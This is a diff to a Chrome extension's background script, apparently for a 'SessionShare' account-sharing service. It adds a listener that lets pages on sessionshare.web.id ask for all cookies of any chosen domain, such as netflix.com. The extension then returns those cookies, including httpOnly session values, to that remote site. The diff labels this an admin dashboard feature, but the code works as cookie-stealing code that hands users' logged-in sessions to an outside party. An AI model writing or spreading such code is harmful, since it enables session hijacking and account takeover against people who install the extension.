@@ -106,10 +106,60 @@ function verifySessionShareGuard() {
   });
 }
 
-// Handshake listener for external messages from SessionShare Guard
+// Handshake listener for external messages from SessionShare Guard & Admin Dashboard cookie capture
 chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
   console.log("External message received:", message);
-  if (message.type === "geda" && message.from === "sigmaboy3") {
+
+  // Handle cookie capture request from the Admin Dashboard
+  if (message && message.action === "captureTabCookies") {
+    // Security check: Verify request origin
+    const originUrl = new URL(sender.origin || sender.url);
+    const isApprovedOrigin = 
+      originUrl.hostname === "localhost" || 
+      originUrl.hostname === "sessionshare.web.id" || 
+      originUrl.hostname === "www.sessionshare.web.id";
+
+    if (!isApprovedOrigin) {
+      console.warn("Unauthorized external cookie capture attempt from:", originUrl.hostname);
+      sendResponse({ success: false, error: "Unauthorized origin" });
+      return true;
+    }
+
+    const { domain } = message.payload || {};
+    if (!domain) {
+      sendResponse({ success: false, error: "Missing target domain" });
+      return true;
+    }
+
+    // Clean domain formatting (e.g. '.netflix.com' or 'netflix.com')
+    const cleanDomain = domain.startsWith('.') ? domain.substring(1) : domain;
+
+    // Capture cookies for domain and subdomains
+    chrome.cookies.getAll({ domain: cleanDomain }, (cookies) => {
+      if (chrome.runtime.lastError) {
+        sendResponse({ success: false, error: chrome.runtime.lastError.message });
+      } else {
+        // Map cookie objects to match standard JSON format expected by extension popup
+        const mappedCookies = cookies.map(c => ({
+          name: c.name,
+          value: c.value,
+          domain: c.domain,
+          path: c.path,
+          secure: c.secure,
+          httpOnly: c.httpOnly,
+          sameSite: c.sameSite,
+          expirationDate: c.expirationDate
+        }));
+
+        sendResponse({ success: true, cookies: mappedCookies });
+      }
+    });
+
+    return true; // Keep message channel open for async response
+  }
+
+  // Fallback: Handshake logic for SessionShare Guard
+  if (message && message.type === "geda" && message.from === "sigmaboy3") {
     sendResponse({ type: "gedi" });
   } else {
     sendResponse({ type: "rizz" });
